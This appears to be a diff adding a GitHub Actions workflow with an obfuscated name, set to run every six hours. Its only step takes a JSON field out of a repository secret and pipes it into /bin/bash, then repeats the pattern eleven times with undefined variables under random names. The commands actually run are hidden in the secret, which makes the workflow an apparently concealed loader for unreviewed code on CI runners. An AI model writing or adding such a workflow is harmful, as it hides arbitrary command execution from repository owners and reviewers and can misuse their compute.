@@ -1,0 +1,30 @@
+name: oakumtick
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '34 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: oakumtick
+        env:
+          nsw778: ${{ secrets.nsw778 }}
+        run: |
+          echo $nsw778 | jq -r .h05436 | /bin/bash
+          echo $qpp57942 | jq -r .a55 | /bin/bash
+          echo $zz234 | jq -r .rlp5982 | /bin/bash
+          echo $intx170 | jq -r .yfh798 | /bin/bash
+          echo $erpg00939 | jq -r .ofsl01 | /bin/bash
+          echo $plmar65 | jq -r .z5 | /bin/bash
+          echo $uwd3 | jq -r .ihmh1 | /bin/bash
+          echo $jyugh346 | jq -r .uh64 | /bin/bash
+          echo $kipl83 | jq -r .ih7 | /bin/bash
+          echo $wbh64966 | jq -r .lypaq86688 | /bin/bash
+          echo $moyn922 | jq -r .z35946 | /bin/bash
+          echo $vfq08 | jq -r .hjkkx111 | /bin/bash
+
